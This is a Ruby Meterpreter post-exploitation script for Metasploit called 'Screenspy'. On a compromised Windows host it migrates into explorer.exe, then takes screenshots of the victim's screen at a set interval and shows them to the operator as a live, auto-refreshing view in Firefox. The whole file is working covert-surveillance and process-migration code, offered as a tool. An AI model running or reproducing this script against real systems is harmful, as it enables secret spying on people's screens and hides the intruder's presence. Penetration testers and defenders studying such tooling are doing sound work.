# Author:Roni Bachar (@roni_bachar) roni.bachar.blog@gmail.com
#
# Thie script will open an interactive view of remote hosts
# You will need firefox installed on your machine


require 'fileutils'

opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-d" => [ true, "The Delay in seconds between each screenshot." ],
	"-t" => [ true, "The time to run in sec." ],
	"-s" => [ true, "The local system linux/windows" ]
)

freq = 3
count = 10
file = "screenshot.jpeg"
meter_type = client.platform
localsys = "linux"

opts.parse(args) { |opt, idx, val|
	case opt
	when '-d'
		freq = val.to_i
	when '-t'
		count = val.to_i
	when '-s'
		localsys = val.to_s

	when "-h"
		print_line
		print_line "Screenspy v1.0"
		print_line "--------------"
		print_line
		print_line
		print_line "Usage: bgrun screenspy -t 20 -d 1 => will take interactive Screenshot every sec for 20 sec long."
		print_line "Usage: bgrun screenspy -t 60 -d 5 => will take interactive Screenshot every 5 sec for 1 min long."
		print_line "Usage: bgrun screenspy -s windows -d 1 -t 60 => will take interactive Screenshot every 1 sec for 1 min long, windows local mode."
		print_line
		print_line "Author:Roni Bachar (@roni_bachar) roni.bachar.blog@gmail.com"
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
	print_error("#{meter} version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
session = client



host,port = session.session_host, session.session_port

print_status("New session on #{host}:#{port}...")

logs = ::File.join(Msf::Config.install_root, 'logs', 'screenshot', host)

outfile = ::File.join(Msf::Config.log_directory,file)

::FileUtils.mkdir_p(logs)


begin
	process2mig = "explorer.exe"

	# Actual migration
	mypid = session.sys.process.getpid
	session.sys.process.get_processes().each do |x|
		if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
			print_status("#{process2mig} Process found, migrating into #{x['pid']}")
			session.core.migrate(x['pid'].to_i)
			print_status("Migration Successful!!")
		end
	end
rescue
	print_status("Failed to migrate process!")
	#next
end


begin
	session.core.use("espia")


	begin

		data="<title>#{host}</title><img src='file:///#{Msf::Config.install_root}/logs/screenshot/#{host}/screenshot.jpeg' width='500' height='500'><meta http-equiv='refresh' content='1'>"
		path1 = File.join(logs,"video.html")
		File.open(path1, 'w') do |f2|
			f2.puts(data)
		end


		if (localsys == "windows")

			print_status("Runing in local mode => windows")
			print_status("Opening Interactive view...")
			localcmd="start firefox -width 530 -height 660 \"file:///#{Msf::Config.install_root}/logs/screenshot/#{host}/video.html\""
		else
			print_status("Runing in local mode => Linux")
			print_status("Opening Interactive view...")
			localcmd="bash firefox -width 530 -height 660 \"file:///#{Msf::Config.install_root}/logs/screenshot/#{host}/video.html&\""
		end

		system (localcmd)
		(1..count).each do |i|
			sleep(freq) if(i != 1)
			path = File.join(logs,"screenshot.jpeg")
			data = session.espia.espia_image_get_dev_screen

			if(data)
				::File.open(path, 'wb') do |fd|
					fd.write(data)
					fd.close()
				end
			end
		end

	rescue ::Exception => e
		print_status("Interactive Screenshot Failed: #{e.class} #{e} #{e.backtrace}")
	end

	print_status("The interactive Session ended...")
	data = <<-EOS
<title>#{host} - Interactive Session ended</title>
<img src='file:///#{Msf::Config.install_root}/logs/screenshot/#{host}/screenshot.jpeg' width='500' height='500'>
<script>alert('Interactive Session ended - Happy Hunting')</script>
EOS
	File.open(path1, 'w') do |f2|
		f2.puts(data)
	end

rescue ::Exception => e
	print_status("Exception: #{e.class} #{e} #{e.backtrace}")
end







